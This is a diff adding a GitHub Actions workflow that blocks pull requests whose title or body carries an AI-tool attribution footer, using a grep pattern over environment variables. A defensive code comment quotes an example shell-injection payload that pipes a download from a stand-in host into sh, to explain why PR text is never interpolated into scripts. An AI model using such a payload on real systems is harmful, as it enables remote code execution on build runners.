@@ -1,0 +1,92 @@
+name: PR Metadata Policy
+
+# Policy checks whose INPUT is the pull request's metadata, not its code.
+#
+# Split out of the "Build and Test" job so that editing a PR title or body no
+# longer starts the full build, test, package and security pipeline on a head
+# commit whose content has not changed. Before the split, `edited` was in ci.yml's
+# trigger list purely so this gate re-ran on a body edit, and every such edit paid
+# for a two-minute build that inspected a commit range it already knew was clean.
+#
+# Ownership contract: this workflow is the ONE producer of the "PR metadata
+# policy" required check. ci.yml is the one producer of "Build and Test". Neither
+# reports under the other's name, so branch protection can never see two runs
+# competing to define the same context.
+#
+# The commit-message and commit-identity halves of the attribution gate stay in
+# ci.yml, because their input is the BASE..HEAD commit range, which only changes
+# when the code changes.
+
+on:
+  pull_request:
+    branches: [main]
+    # Metadata-only event set. `synchronize` is deliberately absent: a new head
+    # commit cannot change the title or body, so re-running this on every push
+    # would reintroduce exactly the duplication the split removes.
+    types: [opened, edited, reopened]
+
+permissions:
+  contents: read
+
+# Keyed on the PR number and scoped to THIS workflow, so a rapid series of body
+# edits collapses to the newest one, and a metadata edit can never cancel an
+# in-flight code-validation run: the two workflows do not share a group.
+concurrency:
+  group: pr-metadata-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  metadata:
+    name: PR metadata policy
+    runs-on: ubuntu-latest
+    steps:
+      # No checkout. This job reads only the event payload, which is what makes it
+      # seconds rather than minutes, and means it cannot execute PR code.
+      #
+      # dependabot is exempt for the same reason aahp-verify.yml exempts it: its PR
+      # bodies quote upstream release notes verbatim, it cannot edit its own body,
+      # and this is a REQUIRED check with enforce_admins, so a trailer quoted
+      # upstream would hard-block a security update with no way out.
+      #
+      # The exemption is on the STEP, not the job, on purpose. A skipped JOB reports
+      # a non-success conclusion for its check context; keeping the job running and
+      # skipping the step means the required check always reaches a conclusive
+      # success, which is what branch protection needs.
+      - name: No AI attribution in PR title or body
+        if: github.actor != 'dependabot[bot]'
+        env:
+          # The PR title and body are attacker-controlled: anyone who can open a PR
+          # from a fork controls them. They MUST reach the script as environment
+          # variables. Never write ${{ github.event.pull_request.body }} inside a
+          # run: block - Actions substitutes the raw text into the script BEFORE
+          # bash parses it, so a body containing '; curl evil | sh; #' would execute
+          # on the runner. Below they are only ever read as quoted "$VAR", which
+          # bash never re-parses as code.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+        run: |
+          # POSIX-ERE twin of the aahp.config.json "ai-attribution" rule; grep -E has
+          # no (?:...) syntax, so the groups are plain (...). Keep the two in lockstep,
+          # and in lockstep with the commit-message copy in ci.yml.
+          # PROSE that merely describes a footer does not match, which is what keeps
+          # this gate from flagging its own definition and CONTRIBUTING.md's wording.
+          # Anchored on attribution PHRASING plus the anthropic no-reply address, not
+          # on the brand name, so this repo's legitimate threat intelligence about
+          # Claude-branded malware ("Claude Code leak campaign") does not trip it.
+          PATTERN='(generated|created|authored|assisted|written)[ \t]+(with|by)[ \t]+\[?[^ ]{0,20}claude|(co-authored|assisted|generated|created)-by:[^\n]*(claude|anthropic)|noreply@anthropic\.com|\[Claude Code\]\(|claude\.(com/claude-code|ai/code)'
+          fail=0
+
+          if printf '%s' "$PR_TITLE" | grep -Eiq -- "$PATTERN"; then
+            echo "::error title=AI attribution in PR title::Remove the tool/model attribution. The author of record is the human. See CONTRIBUTING.md."
+            fail=1
+          fi
+
+          if printf '%s' "$PR_BODY" | grep -Eiq -- "$PATTERN"; then
+            echo "::error title=AI attribution in PR body::Remove the 'Generated with Claude Code' footer from the PR body. This repo is public and PR bodies are indexed."
+            fail=1
+          fi
+
+          if [ "$fail" -ne 0 ]; then
+            exit 1
+          fi
+          echo "PR metadata policy OK: title and body carry no tool or model attribution."
